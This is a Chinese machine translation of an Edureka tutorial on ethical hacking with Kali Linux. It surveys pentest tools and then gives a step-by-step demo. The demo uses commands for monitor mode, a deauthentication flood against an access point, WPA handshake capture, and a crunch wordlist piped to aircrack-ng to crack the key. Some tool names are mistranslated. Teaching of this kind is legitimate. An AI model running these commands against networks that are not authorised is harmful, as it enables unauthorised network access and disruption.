# 使用 Kali Linux 的道德黑客——Kali Linux 初学者指南

> 原文：<https://medium.com/edureka/ethical-hacking-using-kali-linux-fc140eff3300?source=collection_archive---------0----------------------->

![](img/32c818c5421cffade06afe3e46d4c179.png)

Ethical Hacking with Kali Linux — Edureka

通常，特定的操作系统会被绑定到特定的任务上。任何与图形或内容创作相关的东西都会让我们想起 macOS。类似地，任何黑客行为或只是一般地摆弄网络实用程序也映射到一个特定的操作系统，那就是 **Kali Linux** 。在这篇文章中，我将写一篇 Kali Linux 的概述，以及它如何被用于道德黑客。在这篇关于“使用 Kali Linux 的道德黑客”的文章中，讨论了以下主题:

*   什么是 Kali Linux？
*   Kali Linux 的开发
*   为什么要用 Kali Linux？
*   Kali Linux 的系统要求
*   工具列表
*   动力演示——空调和压缩机

# **什么是 Kali Linux？**

![](img/a1e49b7961d3f5c8b2f532d2994b6115.png)

Kali Linux 是基于 Debian 的 Linux 发行版。这是一个精心制作的操作系统，专门迎合网络分析师和渗透测试人员的喜好。Kali 预装的大量工具的存在将它变成了道德黑客的瑞士刀。Kali Linux 以前被称为 Backtrack，它标榜自己是一个更加完美的继任者，拥有更多以测试为中心的工具，不像 Backtrack 有多个工具可以达到相同的目的，这反过来又使它塞满了不必要的实用程序。这使得使用 Kali Linux 进行道德黑客攻击成为一项简化的任务。

# **开发 Kali Linux**

马体·阿哈罗尼和迪冯·科恩斯是 Kali Linux 的核心开发人员。这是对回溯 Linux 的重写，回溯 Linux 是另一个以渗透测试为中心的 Linux 发行版。Kali 的开发是根据 Debian 标准设定的，因为它从 Debian 库导入了大部分代码。开发始于 2012 年 3 月初，由一小组开发人员完成。只有极少数的开发者被允许提交包，这也是在一个受保护的环境中。Kali Linux 在 2013 年发布了第一个版本。从那以后，Kali Linux 经历了许多重大更新。这些更新的开发由攻击性安全部门负责。

# **为什么要用 Kali Linux？**

关于为什么应该使用 Kali Linux，有很多原因。让我列出其中的一些:

1.  **尽可能的免费** — Kali Linux 已经并将永远免费使用。
2.  **比您能想到的更多的工具** — Kali Linux 附带了 600 多种不同的渗透测试和安全分析相关工具。
3.  **开源** —作为 Linux 家族的一员，Kali 遵循广受好评的开源模式。他们的开发树在 Git 上是公开可见的，所有代码都可以用于您的调整目的。
4.  **多语言支持** —虽然渗透工具倾向于用英语编写，但已经确保 Kali 包括真正的多语言支持，允许更多用户用他们的母语操作并找到他们工作所需的工具。
5.  **完全可定制**——“进攻安全”的开发者明白，不是每个人都会同意他们的设计模型，所以他们尽可能地让更喜欢冒险的用户更容易[定制他们喜欢的](https://docs.kali.org/?cat_ID=7) Kali Linux，一直到内核。

# 【Kali Linux 的系统要求

安装 Kali 是小菜一碟。你所要做的就是确保你有兼容的硬件。在 i386、amd64 和 ARMEL 和 ARMHF)平台上支持 Kali。下面列出了最低的硬件要求，尽管更好的硬件自然会提供更好的性能。

*   Kali Linux 安装至少需要 20 GB 的磁盘空间。
*   适用于 i386 和 amd64 架构的 RAM，最低 1GB，建议 2GB 或更高。
*   CD-DVD 驱动器/ USB 启动支持/ VirtualBox

# **工具列表**

下面是使用 Kali Linux 预装的道德黑客工具列表。这个列表绝不是扩展的，因为 Kali 有太多的工具，所有这些都不能在一篇文章中列出和解释。

## 空气裂化

![](img/761bd7194d45b78bad1d433b2c6764bc.png)

Aircrack-ng 是一套用于评估 WiFi 网络安全的工具。它侧重于 WiFi 安全的关键领域:

*   **监控**:数据包捕获和数据导出到文本文件，供第三方工具进一步处理。
*   **攻击**:通过数据包注入的重放攻击、去认证、伪造接入点等。
*   **测试**:检查 WiFi 卡和驱动能力(捕捉和注入)。
*   **开裂** : WEP 和 WPA PSK (WPA 1 和 2)。

所有的工具都是命令行，允许繁重的脚本。很多图形用户界面都利用了这个特性。它主要运行于 Linux，但也运行于 Windows、OS X、FreeBSD、OpenBSD、NetBSD 以及 Solaris。

## Nmap

![](img/cf91ba96e760e21087536e1db05ee1f7.png)

网络映射器，也称为 Nmap，是一个免费的开源工具，用于网络发现和安全审计。Nmap 以隐蔽的方式使用原始 IP 数据包来确定网络上可用的主机、这些主机提供的服务(应用程序名称和版本)、它们运行的操作系统、使用的数据包过滤器/防火墙的类型以及许多其他特征。

许多系统和网络管理员也发现它对以下任务很有用:

*   网络清单
*   管理服务升级计划
*   监控主机或服务的正常运行时间

## 九头蛇

![](img/71fd5f6d1891728484d0002633251ed3.png)

当您需要强力破解远程认证服务时，Hydra 通常是首选工具。它可以对 50 多种协议进行快速字典攻击，包括 telnet、FTP、HTTP、HTTPs、SMB、几个数据库等等。它可以被用来破解网页扫描器，无线网络，数据包制造者等。

## 涅索斯

![](img/0090e2f15374fb95756e7dc4dfc0e75e.png)

Nessus 是一个远程扫描工具，可以用来检查计算机的安全漏洞。它不会主动阻止您的计算机存在的任何漏洞，但它能够通过快速运行 **1200+** 漏洞检查来嗅出这些漏洞，并在需要修补任何安全补丁时发出警报。

## WireShark

![](img/0006e0f58774d59b225459e88d92517a.png)

WireShark 是一款开源的数据包分析器，您可以免费使用。有了它，您可以从微观层面查看网络上的活动，同时还可以访问 pcap 文件、定制报告、高级触发器、警报等。据报道，它是世界上使用最广泛的 Linux 网络协议分析器。

# 力量的展示:空气破裂和挤压

**第一步**:检查你的无线接口名称，并将其置于监控模式。

```
ifconfig wlo1 down
iwconfig wlo1 mode monitor
ifconfig wlo1 up
```

![](img/dbe92cf1f1d8bf7f85dc41d7ff1b9cd4.png)

**第二步**:杀死任何可能干扰扫描过程的进程。总是先干掉网络管理员。您可能需要多次运行所示命令。

```
airmon-ng check kill
```

![](img/6dc076203fa7156bb79a0ac1deb6fe6f.png)

**第三步**:成功杀死所有进程后，运行命令—**airodump-ng<interface—name>**。它应该会生成一个接入点列表，如下所示:

```
airodump-ng wlo1
```

![](img/1f15ad20a7013d83e5a074db6865e5f9.png)

**第 4 步**:选择接入点，并使用-w 标志运行它，将结果写入一个文件。我们的文件叫做捕获。

```
airodump-ng -w capture -c 11 --bssid [mac-addr]
```

![](img/b9e934486a165f080c2a37e5629b15ff.png)

**步骤 5** :运行上述命令应该会在*stations 下显示连接到该接入点的设备的 MAC 地址。*

![](img/18582bda02ff060436ae336ca4dcda52.png)

**第 6 步** —这是使用 Kali Linux 进行道德黑客攻击的最重要的一步。这里，我们将向我们选择攻击的接入点广播一个取消认证信号。这将断开连接到接入点的设备。因为这些设备很可能存储了密码，所以它们会尝试自动重新连接。这将启动设备和接入点之间的 4 次握手，并将在从步骤 4 开始的扫描中被捕获(是的，该扫描仍在后台运行)。

```
aireplay-ng -0 0 -a [mac] wlo1
```

![](img/acde0a67052b1cb9ee8037c419296a31.png)

**步骤 7** :现在我们将 crunch 与 air cracking 一起使用。Crunch 是一个单词列表生成器。这个破解密码的过程假设你对密码有一点了解，例如，长度，一些特定的字符等。你知道的越多，过程就越快。在这里，我尝试生成一个以“sweetship”开头的单词列表，因为我知道 password 包含这个短语。结果被传送到 aircrack 命令，该命令获取捕获文件并比较键值。

```
crunch 12 12 -t sweetship@@@ | aircrack-ng -w - capture-01.cap -e Nestaway_C105
```

![](img/5820225736326daed3e22a8ce4861450.png)

**步骤 8:** 根据您输入的参数，扫描结果应该是这样的。

![](img/7d155716e3f7e6db6f6c58c3f21be96b.png)

**第九步**:密码匹配时。它显示在*“找到钥匙”后面的括号中。*

![](img/7c3e9fb1f85db4971e2c5c9edf1c0ddc.png)

这就把我们带到了使用 Kali Linux 进行道德黑客的文章的结尾。我希望这篇文章对你有所帮助，并增加了你的知识价值。如果你想查看更多关于人工智能、DevOps、云等市场最热门技术的文章，你可以参考 Edureka 的官方网站。

请留意本系列中的其他文章，它们将解释道德黑客的各个方面。

> 1.[什么是网络安全？](/edureka/what-is-cybersecurity-778feb0da72)
> 
> 2.[网络安全框架](/edureka/cybersecurity-framework-89bbab5aaf17)
> 
> 3.[隐写术教程](/edureka/steganography-tutorial-1a3c5214a00f)
> 
> 4.[什么是网络安全？](/edureka/what-is-network-security-1f659407dcc)
> 
> 5.[什么是计算机安全？](/edureka/what-is-computer-security-c8eb1b38de5)
> 
> 6.[什么是应用安全？](/edureka/application-security-tutorial-e6a0dda25f5c)
> 
> 7.[渗透测试](/edureka/what-is-penetration-testing-f91668e2291a)
> 
> 8.[道德黑客教程](/edureka/ethical-hacking-tutorial-1081f4aacc53)
> 
> 9.[什么是密码学？](/edureka/what-is-cryptography-c94dae2d5974)
> 
> 10.[使用 Python 的道德黑客](/edureka/ethical-hacking-using-python-c489dfe77340)
> 
> 11. [DDOS 攻击](/edureka/what-is-ddos-attack-9b73bd7b9ba1)
> 
> 12.[使用 Python 的 MAC changer](/edureka/macchanger-with-python-ethical-hacking-7551f12da315)
> 
> 13 [ARP 欺骗](/edureka/python-arp-spoofer-for-ethical-hacking-58b0bbd81272)
> 
> 14. [Proxychains，Anonsurf & MacChange](/edureka/proxychains-anonsurf-macchanger-ethical-hacking-53fe663b734)
> 
> 15.[足迹](/edureka/footprinting-in-ethical-hacking-6bea07de4362)
> 
> 16.[50 大网络安全面试问答](/edureka/cybersecurity-interview-questions-233fbdb928d3)

*原载于 2019 年 1 月 24 日*[*【www.edureka.co】*](https://www.edureka.co/blog/ethical-hacking-using-kali-linux/)*。*